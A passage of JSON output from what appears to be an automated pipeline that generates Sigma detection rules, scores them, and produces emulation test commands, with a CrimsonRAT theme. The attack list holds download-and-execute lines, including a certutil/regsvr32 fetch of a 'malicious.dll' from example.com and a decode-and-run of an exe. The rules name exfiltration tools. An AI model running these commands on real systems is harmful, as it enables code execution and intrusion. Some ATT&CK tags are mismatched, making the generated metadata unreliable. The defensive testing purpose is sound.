            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "-enc",
              "Out-File",
              "System.Net.WebClient"
            ]
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-decode",
              "-encode",
              "-urlcache"
            ]
          },
          "selection_bitsadmin": {
            "Image|endswith": "\bitsadmin.exe",
            "CommandLine|contains": [
              "/transfer",
              "http"
            ]
          },
          "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin"
        },
        "falsepositives": [
          "Legitimate use of command line tools for system administration",
          "False positives may occur due to benign network activity"
        ],
        "level": "high",
        "tags": [
          "attack.exfiltration",
          "attack.t1567",
          "exfiltration.over.c2.channel"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over C2 Channel",
        "generation_method": "langchain",
        "id": "923d6f9f-f718-447f-9b23-c6aa9c3320f1"
      },
      {
        "title": "Archive Collected Data via Process Creation",
        "description": "Detects Archive Collected Data activity via process creation events",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\7z.exe",
              "\\zip.exe",
              "\\rar.exe",
              "\\tar.exe"
            ],
            "CommandLine|contains": [
              "a",
              "c",
              "-a",
              "--archive"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate archiving operations",
          "Compressing files for backup purposes"
        ],
        "level": "medium",
        "tags": [
          "attack.collection",
          "attack.t1560",
          "custom.sigma",
          "custom.archived"
        ],
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "generation_method": "langchain",
        "id": "f69eff42-23b2-4d92-80ab-821f7accdc42"
      },
      {
        "title": "Account Discovery via Command Line Tools",
        "description": "Detected Account Discovery activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_net_user": {
            "Image|endswith": "\net.exe",
            "CommandLine|contains": [
              "user",
              "group",
              "localgroup",
              "accounts"
            ]
          },
          "selection_dsquery": {
            "Image|endswith": "\\dsquery.exe",
            "CommandLine|contains": [
              "user",
              "group",
              "computer"
            ]
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": [
              "useraccount",
              "group",
              "netuser"
            ]
          },
          "condition": "selection_net_user or selection_dsquery or selection_wmic"
        },
        "falsepositives": [
          "Administrative tasks",
          "Scripted user management"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1562",
          "custom.sigma"
        ],
        "ttp_id": "unknown",
        "technique_name": "Account Discovery",
        "generation_method": "langchain",
        "id": "477dd14d-e23c-46bd-8714-3a84ce3b92c1"
      },
      {
        "title": "Screen Capture via NLP Pattern Matching",
        "description": "Detects Screen Capture activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\mspaint.exe",
              "\\snippingtool.exe"
            ],
            "CommandLine|contains": [
              "/clip",
              "-clip"
            ]
          },
          "selection_parent": {
            "ParentImage|endswith": [
              "\\explorer.exe",
              "\\winword.exe"
            ]
          },
          "condition": "selection and selection_parent"
        },
        "falsepositives": [
          "Legitimate screenshot captures by users",
          "Gaming applications using screen capture functionality"
        ],
        "level": "medium",
        "tags": [
          "attack.collection",
          "attack.t1560",
          "attack.screen_capture"
        ],
        "ttp_id": "unknown",
        "technique_name": "Screen Capture",
        "generation_method": "langchain",
        "id": "e23e7dcc-d28d-4d06-a3f3-6b88134aadfa"
      },
      {
        "title": "Phishing Detection via Office Process Spawning Command Shells",
        "description": "Detects Office processes spawning command shells, a common indicator of phishing attacks",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "ParentImage|endswith": [
              "\\WINWORD.EXE",
              "\\EXCEL.EXE",
              "\\PPT.EXE"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate office automation scripts",
          "Administrative tasks using command shells"
        ],
        "level": "medium",
        "tags": [
          "attack.t1566",
          "attack.initial_access"
        ],
        "ttp_id": "unknown",
        "technique_name": "Phishing",
        "generation_method": "langchain",
        "id": "8c88b1e8-0e85-443a-bb91-57a9cbdd862d"
      },
      {
        "title": "User Execution: Malicious File",
        "description": "Detected User Execution: Malicious File activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ],
            "ParentImage|endswith": [
              "\\winword.exe",
              "\\excel.exe",
              "\\outlook.exe"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate execution of cmd.exe or powershell.exe by administrators or developers",
          "Execution of cmd.exe or powershell.exe for automation purposes"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1566",
          "attack.t1204"
        ],
        "ttp_id": "unknown",
        "technique_name": "User Execution: Malicious File",
        "generation_method": "langchain",
        "id": "9ccd2e07-446a-4493-992b-582d57a1f328"
      }
    ]
  },
  "evaluation": {
    "status": "success",
    "summary": {
      "rules_evaluated": 18,
      "average_quality_score": 0.569,
      "passing_rules": 1,
      "failing_rules": 17,
      "langchain_evaluations": 54,
      "fallback_evaluations": 0,
      "errors": 0,
      "processing_time_ms": 10622.823999999999
    },
    "evaluation_results": [
      {
        "rule_title": "T1204 - User Execution via Malicious Document",
        "rule_id": "23db6176-6ab4-4ed5-951d-420ee3b7e031",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific TTP (T1204 - User Execution)",
          "It uses a clear and focused detection logic",
          "The rule includes a list of potential false positives"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification",
          "It may produce false positives due to legitimate Microsoft Office documents with macros or administrative tasks using command shells",
          "The rule does not contain any IPs or domains, but it relies on specific process names which could be evaded by attackers"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's effectiveness",
          "Consider adding more conditions to reduce false positives",
          "Expand the rule to cover other potential execution methods beyond cmd.exe and powershell.exe",
          "Regularly review and update the rule to ensure it remains effective against evolving threats"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "T1059 - Command and Scripting Interpreter via .Net Dropper",
        "rule_id": "2c6bd7c8-5367-435e-a45b-b2f678c6729d",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific TTP (T1059) and uses relevant log sources (Sysmon) and detection logic (checking for .Net Dropper programs)"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment, which raises concerns about its effectiveness",
          "The rule may generate false positives due to legitimate .Net applications using cmd.exe or powershell.exe",
          "The rule contains no IPs or domains, but the lack of verification makes it difficult to assess its accuracy"
        ],
        "suggestions": [
          "Verify the rule in a real-world environment to assess its detection coverage and false positive rate",
          "Consider adding more specific conditions to reduce false positives, such as checking for suspicious command line arguments or network activity",
          "Add more detailed documentation and comments to the rule to improve its understandability and maintainability"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "System Information Discovery via CrimsonRAT",
        "rule_id": "ed53ff08-0b14-43c7-8d43-6adbded0b075",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific TTP (T1082 - System Information Discovery)",
          "It covers multiple system information discovery commands (systeminfo.exe, tasklist.exe, wmic.exe)"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment",
          "It may generate false positives due to legitimate system administration tasks",
          "The rule does not contain any specific IOCs (IPs, domains, etc.) related to CrimsonRAT malware"
        ],
        "suggestions": [
          "Verify the rule in a real-world environment to assess its detection coverage and false positive rate",
          "Add more specific conditions to reduce false positives (e.g., filtering out known system administration tools)",
          "Include IOCs related to CrimsonRAT malware to improve the rule's effectiveness",
          "Consider adding more system information discovery commands to the rule to increase its completeness"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exploit Public-Facing Application via Malicious Document",
        "rule_id": "1e4b238f-2f6f-41b0-af2c-77bd0809c05a",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (T1190) and has a clear description",
          "It uses a specific log source (Sysmon) and product (Windows)",
          "The rule has a defined level (high) and relevant tags"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world scenario, which raises concerns about its effectiveness",
          "The false positives section mentions legitimate Microsoft Office document editing and administrative tasks, which could lead to a high false positive rate",
          "The rule contains no IPs or domains, but it does not include any specific TTP information beyond the technique name",
          "The condition is simple and only looks for two specific process creations, which might not cover all possible scenarios"
        ],
        "suggestions": [
          "Perform real-world verification to test the rule's effectiveness and adjust the detection logic as needed",
          "Add more specific conditions to reduce false positives, such as filtering out known legitimate processes or adding more context to the detection logic",
          "Consider adding more TTP information, such as specific IOCs or behavioral patterns, to improve the rule's accuracy and completeness",
          "Review and refine the rule to ensure it covers all possible scenarios for the targeted technique (T1190)"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "T1566 - Phishing via Malicious Document with Macro Code",
        "rule_id": "e3c7dd0a-5ce8-4884-b4dc-8e7f139b39a9",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific TTP (T1566 - Phishing)",
          "It uses a clear and focused detection logic",
          "The rule includes a list of potential false positives"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification",
          "It may not cover all possible phishing scenarios via malicious documents",
          "The rule contains no IPs or domains, but the TTP info is also empty, which might indicate incomplete information"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's effectiveness",
          "Consider adding more detection logic to cover other potential phishing scenarios",
          "Review and update the TTP information to ensure it is complete and accurate"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "CrimsonRAT Data Collection",
        "rule_id": "acc7c816-475b-4618-9257-1342640274df",
        "quality_score": 0.65,
        "status": "fail",
        "strengths": [
          "The rule targets a specific malware (CrimsonRAT) and technique (T1005 - Data from Local System)",
          "It uses specific process creation events and command line arguments to detect suspicious activity"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment, which raises concerns about its effectiveness",
          "It may produce false positives due to legitimate screenshot and file collection activity",
          "The rule does not contain any IPs or domains, but it relies on specific executable names and command line arguments that may be evaded by attackers"
        ],
        "suggestions": [
          "Verify the rule in a real-world environment to assess its detection coverage and false positive rate",
          "Consider adding more specific conditions or filtering out legitimate activity to reduce false positives",
          "Regularly update the rule to stay ahead of evolving attacker techniques and tactics"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detection of Signed Binary Proxy Execution via CrimsonRAT",
        "rule_id": "45ef650a-8d0f-4a1a-a1c7-665a92134c82",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific TTP (T1218 - Signed Binary Proxy Execution)",
          "It uses a clear and focused detection logic",
          "The rule includes a list of potential false positives"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment",
          "It may generate false positives due to legitimate use of Firefox and command line tools",
          "The rule does not contain any IPs or domains, but it could be improved with more specific indicators"
        ],
        "suggestions": [
          "Verify the rule in a real-world environment to assess its detection coverage and false positive rate",
          "Add more specific indicators, such as known malicious domains or IPs, to improve the rule's accuracy",
          "Consider adding additional detection logic to reduce false positives, such as filtering out known legitimate processes or commands"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Reflective Code Loading via .Net Dropper",
        "rule_id": "ca4d1b43-d997-45dc-9e7e-db04cb061589",
        "quality_score": 0.32,
        "status": "fail",
        "strengths": [
          "The rule is well-structured and follows the Sigma format",
          "It targets a specific TTP (T1620 - Reflective Code Loading)"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification",
          "It may produce false positives due to legitimate .Net applications",
          "The condition is too broad and may lead to false positives",
          "The rule contains no IPs/Domains, but the TTP info is also empty, so no hallucinations are present"
        ],
        "suggestions": [
          "Perform real-world verification to test the rule's effectiveness",
          "Refine the condition to reduce false positives",
          "Consider adding more specific indicators or filtering out known legitimate applications",
          "Add more context to the TTP info to improve the rule's accuracy"
        ],
        "metrics": {
          "accuracy": 0.0,
          "completeness": 0.8,
          "efficiency": 0.6,
          "maintainability": 0.2
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Ingress Tool Transfer via .Net Dropper",
        "rule_id": "bab62857-a6d9-4163-b43b-c1ec42ab3fe9",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule is well-structured and follows the Sigma format",
          "It targets a specific TTP (T1105 - Ingress Tool Transfer) and includes relevant tags"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment, which raises concerns about its effectiveness",
          "It may produce false positives due to legitimate .Net applications and PowerShell scripts used by administrators",
          "The rule contains no IPs or domains, but the TTP information is incomplete"
        ],
        "suggestions": [
          "Perform real-world verification to test the rule's detection capabilities",
          "Refine the rule to reduce false positives, such as by adding additional conditions or filtering out known legitimate applications",
          "Update the TTP information to include more context and details about the attack technique"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exfiltration Over Command and Control Channel via CrimsonRAT",
        "rule_id": "32b36b71-9d42-4f12-a17b-e3e55e2b24b9",
        "quality_score": 0.65,
        "status": "fail",
        "strengths": [
          "The rule targets a specific TTP (T1041 - Exfiltration Over Command and Control Channel)",
          "It uses specific process creation events from Sysmon logs",
          "The rule includes potential false positives and suggests the need for tuning"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification",
          "It may generate false positives due to legitimate use of cmd.exe or powershell.exe",
          "The rule contains no IPs or domains, but it lacks specific TTP information (e.g., specific command lines or parameters used by CrimsonRAT)"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's effectiveness",
          "Tune the rule to reduce false positives based on the specific environment",
          "Add more specific conditions to the rule to better match the TTP",
          "Consider adding more log sources or conditions to increase detection coverage"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "CrimsonRAT Remote Services Detection",
        "rule_id": "9c04763b-99e4-4bf1-92c5-d139bb7601ba",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific TTP (T1021 - Remote Services)",
          "It uses specific command line flags (-connect, -remote) to detect remote connections",
          "The rule includes a list of potential false positives"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment",
          "It may produce false positives due to similar command line flags used by other applications",
          "The rule does not contain any IPs or domains, but it does not provide any additional context or filtering to reduce false positives"
        ],
        "suggestions": [
          "Verify the rule in a real-world environment to assess its detection coverage and false positive rate",
          "Add additional filtering or context to reduce false positives, such as user or process information",
          "Consider adding more specific conditions or rules to detect other aspects of the CrimsonRAT malware"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Virtualization/Sandbox Evasion via CrimsonRAT",
        "rule_id": "b86c1453-fa0a-4f8e-9384-1fa42bd80b0a",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (T1497) and includes relevant tags and a clear description",
          "It covers multiple potential evasion methods using different executables (cmd.exe, powershell.exe, certutil.exe)"
        ],
        "weaknesses": [
          "The rule lacks real-world verification, making its effectiveness uncertain",
          "It may produce false positives due to legitimate use of the targeted executables and commands",
          "The rule does not contain any specific IPs or domains, but its generality might lead to more false positives",
          "No specific TTP ID is provided, which could help in tracking and understanding the rule's target"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection coverage and false positive rate accurately",
          "Consider adding more specific conditions or filtering to reduce false positives",
          "Include a TTP ID for better tracking and understanding of the rule's target technique",
          "Regularly review and update the rule based on new intelligence and verification results to ensure its effectiveness and relevance"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exfiltration Over C2 Channel",
        "rule_id": "923d6f9f-f718-447f-9b23-c6aa9c3320f1",
        "quality_score": 0.65,
        "status": "fail",
        "strengths": [
          "The rule targets a specific TTP (Exfiltration Over C2 Channel)",
          "It covers multiple potential tools and techniques for exfiltration (cmd, powershell, certutil, bitsadmin)"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment",
          "It may produce false positives due to legitimate use of command line tools for system administration",
          "The rule contains no specific IPs or domains, but the lack of verification makes it difficult to assess its effectiveness"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection coverage and false positive rate",
          "Consider adding more specific conditions to reduce false positives",
          "Add more logging sources to increase detection coverage",
          "Continuously monitor and update the rule to ensure it remains effective against evolving threats"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Archive Collected Data via Process Creation",
        "rule_id": "f69eff42-23b2-4d92-80ab-821f7accdc42",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (Archive Collected Data) and includes relevant process creation events",
          "It covers various archiving tools (7z, zip, rar, tar) and command-line arguments"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment, which raises concerns about its effectiveness",
          "It may generate false positives due to legitimate archiving operations",
          "The rule contains no IPs or domains, but it lacks specific TTP information (e.g., tactic)"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection coverage and false positive rate",
          "Consider adding more specific conditions to reduce false positives (e.g., excluding backup-related processes)",
          "Include more detailed TTP information to improve the rule's completeness and effectiveness"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Account Discovery via Command Line Tools",
        "rule_id": "477dd14d-e23c-46bd-8714-3a84ce3b92c1",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (Account Discovery) and uses relevant command line tools",
          "It covers multiple tools (net.exe, dsquery.exe, wmic.exe) which is a strength in detection coverage"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment, which raises concerns about its effectiveness",
          "The presence of false positives (Administrative tasks, Scripted user management) could lead to unnecessary noise",
          "The rule contains no IPs or domains, but the lack of verification and potential for false positives are concerns"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection capabilities",
          "Refine the rule to reduce false positives (e.g., by adding additional conditions or filtering out known administrative tasks)",
          "Consider adding more tools or techniques to the rule to increase detection coverage",
          "Regularly review and update the rule to ensure it remains effective against evolving threats"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Screen Capture via NLP Pattern Matching",
        "rule_id": "e23e7dcc-d28d-4d06-a3f3-6b88134aadfa",
        "quality_score": 0.7,
        "status": "pass",
        "strengths": [
          "The rule uses specific process names and command line arguments to detect screen capture activity",
          "It considers the parent process to reduce false positives"
        ],
        "weaknesses": [
          "The rule does not account for other screen capture tools or methods",
          "It may generate false positives for legitimate screenshot captures by users or gaming applications",
          "The rule contains no IPs or domains, but it lacks a clear tactic in the target TTP"
        ],
        "suggestions": [
          "Add more process names and command line arguments to detect other screen capture tools or methods",
          "Consider adding additional conditions to reduce false positives, such as excluding certain user groups or processes",
          "Include a clear tactic in the target TTP to improve the rule's context and effectiveness",
          "Perform real-world verification to validate the rule's detection coverage and false positive rate"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Phishing Detection via Office Process Spawning Command Shells",
        "rule_id": "8c88b1e8-0e85-443a-bb91-57a9cbdd862d",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific and relevant technique (Phishing) with a clear description",
          "It uses a specific log source (Sysmon) for process creation events",
          "The rule includes potential false positives and tags for attack tactics"
        ],
        "weaknesses": [
          "The rule lacks real-world verification, making its effectiveness uncertain",
          "It does not specify a tactic in the Target TTP",
          "The rule may produce false positives due to legitimate office automation scripts or administrative tasks"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection coverage and false positive rate",
          "Add more specific conditions to reduce false positives (e.g., filtering by user or command line arguments)",
          "Include a tactic in the Target TTP to better align with the MITRE ATT&CK framework",
          "Consider adding more Office applications to the ParentImage filter to increase detection coverage"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "User Execution: Malicious File",
        "rule_id": "9ccd2e07-446a-4493-992b-582d57a1f328",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (User Execution: Malicious File) and uses relevant log sources (Sysmon) and products (Windows).",
          "The rule includes a clear description and relevant tags (attack.execution, attack.t1566, attack.t1204)."
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification, which raises concerns about its effectiveness.",
          "The rule may generate false positives due to legitimate execution of cmd.exe or powershell.exe by administrators or developers.",
          "The rule contains no IPs or domains, but the lack of verification and potential for false positives are concerns.",
          "The 'generation_method' is listed as 'langchain', which may indicate a lack of human oversight or expertise in the rule's creation."
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection coverage and false positive rate.",
          "Refine the rule to reduce false positives, such as by adding additional conditions or filtering out known legitimate activity.",
          "Consider adding more specific conditions or filtering to improve the rule's detection coverage and reduce noise.",
          "Review and refine the rule to ensure it is optimized for performance and completeness."
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      }
    ],
    "feedback": {
      "timestamp": "2025-12-21T18:02:35.825187",
      "source_agent": "7e27d14c-f90b-48c5-a0b8-cb7051f90aa7",
      "target_agent": "rulegen",
      "average_quality_score": 0.569,
      "total_rules_evaluated": 18,
      "improvements_needed": [
        {
          "metric": "quality",
          "current_value": 0.5694444444444444,
          "target_value": 0.85,
          "suggestion": "Improve overall rule quality"
        }
      ],
      "common_issues": [
        "The rule has not been verified in a real-world environment, which raises concerns about its effectiveness",
        "The rule did not undergo real-world verification",
        "The rule has not been verified in a real-world environment",
        "The rule lacks real-world verification, making its effectiveness uncertain",
        "It may produce false positives due to legitimate Microsoft Office documents with macros or administrative tasks using command shells"
      ],
      "actionable_suggestions": [
        "Verify the rule in a real-world environment to assess its detection coverage and false positive rate",
        "Perform real-world verification to assess the rule's effectiveness",
        "Perform real-world verification to assess the rule's detection coverage and false positive rate",
        "Regularly review and update the rule to ensure it remains effective against evolving threats",
        "Consider adding more conditions to reduce false positives"
      ]
    }
  },
  "attacks": [
    {
      "id": "8b450684-62f8-4455-a162-4332146883f3",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "T1204 - User Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Write-Host 'Test Macro Execution'\"",
      "description": "Basic: Detects the execution of a simple PowerShell command through a malicious document with macro code",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command will print 'Test Macro Execution' to the console",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:01.256420",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "dc099f35-bcb9-413a-b1bc-6b343fe3b49e",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "T1204 - User Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -f -urlcache http://example.com/malicious.dll %TEMP%\\malicious.dll && regsvr32 /s /i:%TEMP%\\malicious.dll scrobj.dll",
      "description": "Intermediate: Exploits the certutil and regsvr32 utilities to download and execute a malicious DLL",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The command will download a file from a URL, save it to the temp directory, and then attempt to register it as a COM object",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:01.256420",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7f20d625-e198-479f-a402-a7ff70d96120",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "T1204 - User Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('SGVsbG8gd29ybGQ=')); [System.Console]::WriteLine('Hello World')\"",
      "description": "Advanced: Uses PowerShell to load a Base64 encoded string as an assembly and execute it",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command will print 'Hello World' to the console",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:01.256420",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ea43c41b-0a2a-4ad5-81cf-0b7c065fbc08",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "T1059 - Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('file://%TEMP%\\test.ps1')\"",
      "description": "Detects the use of a .Net Dropper program to execute malware by checking for the existence of a zip file and execution of command and scripting interpreters",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Executes a PowerShell script from a temporary file",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:02.764310",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "18260079-75fa-42c8-9d5e-fd7a51cbb9cf",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "T1059 - Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c certutil -f -decode %TEMP%\\test.zip %TEMP%\\test.exe && %TEMP%\\test.exe",
      "description": "Detects the use of certutil to decode and execute a binary",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Decodes a zip file and executes the decoded binary",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:02.765547",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "52697c13-bde0-44b5-af1d-6d650c481358",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "T1059 - Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path %TEMP%\\test.txt -Value 'Hello World' -Force; Invoke-Expression (Get-Content -Path %TEMP%\\test.txt -Raw)\"",
      "description": "Detects the use of Set-Content and Invoke-Expression to write and execute a script",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Writes a file and executes its contents as a script",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:02.765547",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "51646b10-ce73-47e4-b642-5b13ce25d812",
      "ttp_id": "unknown",
      "technique_id": "T1082",
      "technique_name": "T1082 - System Information Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "systeminfo",
      "description": "Execute systeminfo to gather system information",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "System information will be displayed in the command prompt",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:03.350107",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "068412e3-1839-4d4b-97e5-91574bd3c516",
      "ttp_id": "unknown",
      "technique_id": "T1082",
      "technique_name": "T1082 - System Information Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-WmiObject -Class Win32_OperatingSystem\"",
      "description": "Use PowerShell to gather system information via WMI",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "System information will be displayed in the PowerShell console",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:03.350107",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b3a7a0e7-4b4c-452e-bd4b-b13f623c048b",
      "ttp_id": "unknown",
      "technique_id": "T1082",
      "technique_name": "T1082 - System Information Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic os get /value",
